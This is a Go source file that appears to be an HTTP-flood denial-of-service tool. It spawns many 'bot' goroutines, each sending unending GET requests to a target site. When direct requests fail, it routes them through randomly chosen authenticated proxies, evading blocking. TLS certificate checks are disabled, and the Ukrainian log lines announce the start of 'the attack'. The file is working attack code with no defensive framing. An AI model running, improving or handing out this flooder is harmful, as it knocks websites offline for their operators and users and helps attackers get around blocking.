package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

type Bot struct {
	c         *http.Client
	req       *http.Request
	id        int
	withProxy bool
}

func NewBot(ctx context.Context, id int, target string, proxy *Proxy, withTLSproxy bool) (*Bot, error) {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.MaxIdleConns = 0 // 0 - no limit
	tr.ReadBufferSize = 100
	tr.IdleConnTimeout = time.Minute * 10

	withProxy := false
	if proxy != nil {
		proxyURL := proxy.IP
		if !strings.HasPrefix(proxy.IP, "http") {
			switch withTLSproxy {
			case true:
				proxyURL = "https://" + proxy.IP
			default:
				proxyURL = "http://" + proxy.IP

			}
		}
		url, err := url.Parse(proxyURL)
		if err != nil {
			return nil, err
		}
		tr.Proxy = http.ProxyURL(url)
		tr.ProxyConnectHeader = http.Header{}
		basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Auth))
		tr.ProxyConnectHeader.Add("Proxy-Authorization", basicAuth)
		withProxy = true
	}

	b := &Bot{
		id:        id,
		withProxy: withProxy,
		c:         &http.Client{Transport: tr},
	}
	if err := b.newRequest(ctx, target); err != nil {
		return nil, err
	}

	return b, nil
}

func (b *Bot) newRequest(ctx context.Context, target string) (err error) {
	b.req, err = http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return err
	}
	// TODO: add some headers
	b.req.Header.Add("User-Agent", GetUserAgent())

	return nil
}

func (b *Bot) ListenAndSend(ctx context.Context, counter chan<- bool) {
	log := log.WithField("bot", b.id)
L:
	for {
		select {
		case <-ctx.Done():
			break L
		default:
			resp, err := b.c.Do(b.req)

			if err != nil {
				if resp != nil {
					log.Errorf("%v (%d %s)", err, resp.StatusCode, http.StatusText(resp.StatusCode))
				} else {
					log.Errorln(err)
				}

				counter <- false
				continue
			}
			resp.Body.Close()
			if resp.StatusCode != http.StatusOK {
				log.Errorf("%d %s", resp.StatusCode, http.StatusText(resp.StatusCode))
				counter <- false
				continue
			}
			counter <- true
		}
		runtime.Gosched()
	}
}

func StartBots(ctx context.Context, wg *sync.WaitGroup, data *HostResp, numOfBots int, counter chan<- bool) error {
	_, err := url.ParseRequestURI(data.Site.URL)
	if err != nil {
		return fmt.Errorf("on parsing target url: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, "GET", data.Site.URL, nil)
	if err != nil {
		return fmt.Errorf("on creaing a request: %w", err)
	}

	resp, err := DefClient.Do(req)
	if err != nil {
		log.Warnf("Надсилаючи запит без проксі: %v\n", err)
	} else {
		resp.Body.Close()
	}

	var getPoxy func() *Proxy = func() *Proxy { return nil }
	if err != nil || resp.StatusCode != http.StatusOK {
		if len(data.Proxies) == 0 {
			return fmt.Errorf("on fetching proxies")
		}
		log.Infoln("Починаємо атаку через HTTP проксі :)")
		getPoxy = func() *Proxy {
			return &data.Proxies[rand.Intn(len(data.Proxies)-1)]
		}
	}

	// TODO: handle errors && and  statisics
	for id := 0; id < numOfBots; id++ {
		select {
		case <-ctx.Done():
			return nil
		default:
			go func(id int) {
				proxy := getPoxy()
				log := log.WithFields(log.Fields{
					"bot":   id,
					"proxy": proxy != nil,
				})

				c, err := NewBot(ctx, id, data.Site.URL, proxy, false)
				if err != nil {
					log.Infof("Під час створення бота: %v\n", err)
				}

				log.Infoln("Запустився")

				wg.Add(1)
				c.ListenAndSend(ctx, counter)
				wg.Done()
			}(id)
		}
	}

	return nil
}
